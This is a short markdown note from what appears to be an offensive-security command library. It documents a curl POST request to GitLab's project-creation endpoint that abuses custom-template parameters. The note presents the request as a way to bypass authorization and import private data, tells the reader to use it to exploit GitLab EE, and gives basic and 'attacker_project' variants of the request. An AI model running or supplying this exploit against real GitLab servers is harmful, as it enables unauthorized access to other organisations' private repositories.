---
id: 1ef99591-c62b-43b7-992d-d82defa12673
name: curl-gitlab-project-create
type: command
executor: bash
data: >-
  curl -X POST "http://instance/projects" -d
  "project[use_custom_template]=true&project[template_name]=test_project&project[group_with_project_templates_id]=1"
  -H "Authorization: Bearer [token]"
output: null
created_at: '2025-12-11T03:47:47.616Z'
updated_at: '2025-12-11T03:47:47.616Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - http
  - gitlab
verified: false
validated: true
submitted: true
---

# curl-gitlab-project-create

## Command

```bash
curl -X POST "http://instance/projects" -d "project[use_custom_template]=true&project[template_name]=test_project&project[group_with_project_templates_id]=1" -H "Authorization: Bearer [token]"
```

## Description

This command sends a modified POST request to create a GitLab project using a custom template, bypassing authorization to import private data. Use it to exploit template import vulnerabilities in GitLab EE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-d "project[use_custom_template]=true&..."` | Data payload with manipulated parameters | Yes |
| `-H "Authorization: Bearer [token]"` | Authentication header with GitLab token | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "http://instance/projects" -d "project[use_custom_template]=true&project[template_name]=test_project&project[group_with_project_templates_id]=1" -H "Authorization: Bearer [token]"
```

### Advanced Usage

```bash
curl -X POST "http://instance/projects" -d "project[use_custom_template]=true&project[template_name]=test_project&project[group_with_project_templates_id]=1&project[name]=attacker_project" -H "Authorization: Bearer [token]" -H "Content-Type: application/x-www-form-urlencoded"
```

## Expected Output

Server response indicating project creation and import initiation, followed by redirection to the new project page.

## Related

- [[procedures/Intercept-and-Modify-Project-Creation-Request-in-GitLab]]
- [[tools/Burp-Suite]]
